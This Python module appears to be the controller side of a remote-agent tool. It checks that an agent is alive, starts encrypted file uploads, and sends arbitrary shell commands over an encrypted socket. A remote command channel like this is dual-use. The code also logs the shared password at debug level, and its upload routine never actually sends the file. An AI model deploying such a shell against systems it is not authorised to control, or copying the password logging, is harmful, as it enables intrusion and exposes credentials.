
import os
import logging
import core.crypto as crypto


def Check(channel, password):


    try:

        logger = logging.getLogger('main')

        bufferSize = 4096
        checkMessage = crypto.encrypt_message(password, 'alive ?').encode()
        channel.sendall(checkMessage)
        rawResponse, tempBuffer = b'', b''

        while True:

            tempBuffer = channel.recv(bufferSize)
            rawResponse += tempBuffer
            
            # If all data are smaller than the buffer size, break While loop
            if len(tempBuffer) < bufferSize:
                break
        # Decode bytes to string to read the answer of the remote agent

        checkAnswer = crypto.decrypt_message(password, rawResponse.decode())
        if checkAnswer == 'alive !':
            logger.info(f"Agent is alive")

    except ConnectionResetError:
        logger.warning(f"Channel reset by peer (broken pipe error)")
        return True


def Upload(channel, password, source, destination):
    """Upload a file to remote agent, destination must be a directory"""

    try:

        logger = logging.getLogger('main')

        logger.debug(f"Channel given : {channel}")
        logger.debug(f"Password given : {password}")
        logger.debug(f"Source file given : {source}")
        logger.debug(f"Basename of given file : {os.path.basename(source)}")
        logger.debug(f"Destination folder given : {destination}")

        homeFolder = os.environ['HOME']
        py314Folder = f"{homeFolder}/.Py314"
        tempFile = f"{py314Folder}/temp.crypt"
        logger.debug(f"Temporary encrypted file : {tempFile}")

        crypto.encrypt_file(password, source, tempFile)

        message = f"send {source} {destination}"
        encryptedMessage = crypto.encrypt_message(password, message)

        channel.sendall(encryptedMessage.encode())

        bufferSize = 4096
        agentAnswer = b''
        # While True, receive data
        while True:
            logger.debug('Waiting for agent answer about transfer...')
            agentAnswer = channel.recv(bufferSize)
            if len(agentAnswer) < bufferSize:
                logger.debug('break recv while loop')
                break
        
        decryptedAnswer = crypto.decrypt_message(password, agentAnswer.decode())
        logger.debug(f"Agent answer : {decryptedAnswer}")
        if decryptedAnswer == '!':
            logger.info(f"Remote directory {destination} doesn't exist")
        elif decryptedAnswer == 'ready':
            logger.debug('Agent is ready for file transfer')
        


        os.remove(tempFile)



    except Exception as error:
        logger.warning('An error occured during sending file : ')
        logger.warning(error)
        
    






def Shell(channel, password, command):
    """Try to interact with remote agent with a shell"""
# Module to send a shell command to remote agent

    logger = logging.getLogger('main')

    logger.debug(f"Channel given : {channel}")
    logger.debug(f"Password given : {password}")

    # Define a buffer size, 1024 bytes
    bufferSize = 4096

    if command == b'':
        pass
    else:
        # Else, send command to remote agent
        command = crypto.encrypt_message(password, command)
        channel.sendall(command.encode())

        rawResponse, tempBuffer = b'', b''
        # While True, receive data
        while True:
            logger.debug('recv from socket...')

            tempBuffer = channel.recv(bufferSize)
            rawResponse += tempBuffer
            
            logger.debug(f'Partial answer : {rawResponse}')
            logger.debug(f'Raw answer lengh : {len(rawResponse)}')
            #logger.debug(f'Temporary buffer : {tempBuffer}')
            # If all data are smaller than the buffer size, break While loop
            if len(tempBuffer) < bufferSize:
                logger.debug('break recv while loop')
                break
        # Decode bytes to string to read the answer of the remote agent
        
        shellReponseEncrypted = rawResponse.decode()
        shellResponse = crypto.decrypt_message(password, shellReponseEncrypted)

        # Print agent's answer
        print(shellResponse)

